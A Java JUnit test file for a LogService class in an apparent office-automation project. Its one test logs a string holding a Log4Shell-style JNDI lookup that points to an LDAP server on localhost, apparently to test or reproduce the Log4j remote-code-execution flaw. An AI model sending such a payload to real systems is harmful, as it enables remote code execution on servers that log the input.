package com.lxx.oa.service;

import org.junit.Test;

import static org.junit.Assert.*;

/**
 * @author 林修贤
 * @date 2023/2/5
 * @description
 */
public class LogServiceTest {
    LogService logService = new LogService();
    @Test
    public void outputError() {
        logService.outputError("?info=${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
    }
}